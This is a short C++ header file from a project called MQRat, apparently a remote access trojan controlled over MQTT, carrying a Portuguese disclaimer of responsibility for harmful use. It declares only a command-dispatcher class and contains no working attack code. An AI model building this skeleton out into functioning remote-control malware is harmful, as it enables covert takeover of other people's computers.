/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#ifndef MQRAT_CMD_DISPATCHER_H
#define MQRAT_CMD_DISPATCHER_H

#include "mqtt_client.hpp"

#define MAX_CMD_SIZE    16

/**
 * @brief The command dispatcher entity
 * 
 */
class CommandDispatcher {
    public:
        explicit CommandDispatcher(MQTTClient_message *msg, MqttClient *client);
        void Dispatch();
        void setMessage(MQTTClient_message *new_msg);
    private:
        MQTTClient_message *message;
        MqttClient *client;
};


#endif
